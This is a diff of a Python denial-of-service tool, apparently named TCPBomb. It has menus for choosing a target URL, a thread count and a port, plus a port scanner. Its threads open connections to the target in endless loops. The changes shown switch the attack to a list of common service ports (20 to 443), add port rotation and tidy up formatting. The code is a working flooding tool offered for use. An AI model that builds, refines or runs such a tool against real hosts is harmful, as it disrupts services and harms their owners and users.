@@ -5,7 +5,7 @@ global op
 global port
 
 url = ""
-port = ""
+port = 80
 threads = 0
 version = float(1.3)
 currentversion = requests.get('https://raw.githubusercontent.com/Dr4k0D3v/TCPBomb/main/CurrentVersion.json')
@@ -26,6 +26,7 @@ def getIp(domain):
         minute = now.minute;
         second = now.second;
         exit(f"[{hour}]:[{minute}]:[{second}] ERROR: Failed to get ip by '"+domain+"' hostaname!")
+
 def verifyports(url,max = False):
     ip = getIp(url)
     p = 0
@@ -45,13 +46,14 @@ def verifyports(url,max = False):
             print(porta, "OPEN"); 
     
 def getRandomPort():
-    p =  random.randint(1,65535)
+    portlist = [int(20), int(21), int(22), int(23), int(25), int(53), int(80), int(443)]
+    p =  random.choice(portlist)
     now = datetime.now();
     hour = now.hour;
     minute = now.minute;
     second = now.second;
-    print(f"[{hour}]:[{minute}]:[{second}] INFO: Using port {p} to attack with 64000 bytes.")
     return p
+
 def attack(host,threads, port = getRandomPort()):
     ip = getIp(host)
 
@@ -63,6 +65,7 @@ def attack(host,threads, port = getRandomPort()):
     t = threading.Thread(target=pr)
     t.start()
     threadList.append(t)
+
 def connect(ip,port):
     global sl
     while True:
@@ -80,6 +83,7 @@ def connect(ip,port):
             s.close()
         except:
             pass
+
 def pr():
     global sl
     global port
@@ -91,6 +95,7 @@ def pr():
     print("")
     print(f"\n[{hour}]:[{minute}]:[{second}] INFO: {sl} connections sends!")
     timemsg = now.second + 3;
+    timeo = sl
 
     while True:
         now = datetime.now();
@@ -102,7 +107,12 @@ def pr():
         atual = now.second;
         hour = now.hour;
         minute = now.minute;
+
+        if sl == timeo:
+            getRandomPort()
+
         if atual == timemsg:
+            timeo = sl
             timemsg = now.second + 3;
             print(f"[{hour}]:[{minute}]:[{second}] INFO: {sl} connections sends!")
 
@@ -150,6 +160,7 @@ def scanMenu():
                 mainMenu()
     except:
             print("[INFO] Invalid option please try again!")
+
 def httpMenu():
     print("_______________________")
     print("""
@@ -200,8 +211,6 @@ def httpMenu():
                     os.system("clear")
                 mainMenu()
 
-            
-
     except:
             print("[INFO] Invalid options please try again!")
     attack(url,threads,port)
@@ -216,6 +225,7 @@ def randomPortMenu():
         [2] - Set the number of Threads!
 
     Options:
+
         [1] - Set URL
         [2] - Set Threads number
         [3] - Start attack
@@ -249,8 +259,7 @@ def randomPortMenu():
                         os.system("cls")
                     else:
                         os.system("clear")
-                        break
-                        
+                        break             
             elif op == 4:
                 time.sleep(2)
                 if os.name == 'nt':
@@ -258,8 +267,6 @@ def randomPortMenu():
                 else:
                     os.system("clear")
                 mainMenu()
-            
-
     except:
             print("[INFO] Invalid option please try again!")
     attack(url,threads)
@@ -325,8 +332,6 @@ def mainMenu():
             elif op == 4:
                 print("Bye")
                 break
-
         except:
             print("[INFO] Invalid options please try again!")
-
 mainMenu()
